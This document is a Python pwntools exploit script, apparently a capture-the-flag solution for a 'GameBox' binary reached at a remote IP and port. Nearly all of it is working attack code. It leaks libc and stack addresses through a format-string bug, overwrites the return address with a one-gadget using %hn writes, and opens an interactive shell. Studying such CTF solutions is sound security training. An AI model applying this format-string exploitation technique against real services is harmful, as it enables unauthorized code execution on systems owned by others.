#!/usr/bin/env python
# coding: utf-8
from pwn import *
context.clear(arch = 'amd64')
context.log_level = "error"
local=False
name = "GameBox"

if local:
    p = process(name)
else:
    p = remote("39.107.33.43", 13570)

r=lambda x: p.recv(x)
ru=lambda x: p.recvuntil(x)
rud=lambda x:p.recvuntil(x,drop="true")
se=lambda x: p.send(x)
sel=lambda x: p.sendline(x)
pick32=lambda x: u32(x[:4].ljust(4,'\0'))
pick64=lambda x: u64(x[:8].ljust(8,'\0'))

def sd(cont):
	p.sendline(cont)
def cv(cont):
	return p.recvuntil(cont)
def attach():
	if local:
		gdb.attach(pidof(name)[0],gdbscript = "source debug")
def debug():
	if local:
		p.close()
		p = gdb.debug("./" + name,"source debug")
def wait():
	if local:
		raw_input()
	else:
		sleep(0.5)

print '[*] PID:',pidof(name)
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

if local:
	off_onegadget = 0xf1147

else:
	off_onegadget = 0xf1117

libc={
    'base':0x0,
    'leaked': 133168,  #unsortedbin = __malloc_hook+0x68
}

def set_base(mod,ref,addr):
    base=addr-mod[ref]
    for element in mod:
        mod[element] += base

def P(v):
    ru("xit")
    sel("P")
    ru("write")
    sel(v)
def add(length,name):
    ru("length")
    sel(str(length))
    ru("name")
    sel(name)
def show():
    ru("xit")
    sel("S")

'''
NWLRBBMQBHCDARZOWKKYHIDD
QSCDXRJMOWFRXSJYBLDBEFSA
RCBYNECDYGGXXPKLORELLNMP
APQFWKHOPKMCOQHNWNKUEWHS
QMGBBUQCLJJIVSWMDKQTBXIX
MVTRRBLJPTNSNFWZQFJMAFAD
RRWSOFSBCNUVQHFFBSAQXWPQ
CACEHCHZVFRKMLNOZJKPQPXR
JXKITZYXACBHHKICQCOENDTO
MFGDWDWFCGPXIQVKUYTDLCGD
EWHTACIOHORDTQKVWCSGSPQO
QMSBOAGUWNNYQXNZLGDGWPBT
'''


P("NWLRBBMQBHCDARZOWKKYHIDD")
add(100,"%13$p and %8$p")
show()
ru("0:")
leaklibc_str = rud(" and ")
leakstack_str = rud("\n")
leaklibc = int(leaklibc_str,16)
leakstack = int(leakstack_str,16)
set_base(libc,"leaked",leaklibc)
og_addr = libc['base'] + off_onegadget
print "[*] leaklibc: ",hex(leaklibc)
print "[*] og_addr: ",hex(og_addr)
retaddr_stack = leakstack + 8 
payload = "%" + str(retaddr_stack % 0x10000) + "c%29$hn"
P("QSCDXRJMOWFRXSJYBLDBEFSA")
add(100,payload)
payload = "%" + str(og_addr % 0x10000) + "c%43$hn"
P("RCBYNECDYGGXXPKLORELLNMP")
add(100,payload)
payload = "%" + str(retaddr_stack % 0x10000 + 2) + "c%29$hn"
P("APQFWKHOPKMCOQHNWNKUEWHS")
add(100,payload)
payload = "%" + str((og_addr / 0x10000) % 0x100) + "c%43$hhn"
P("QMGBBUQCLJJIVSWMDKQTBXIX")
add(100,payload)
show()
p.sendline("E")
p.interactive()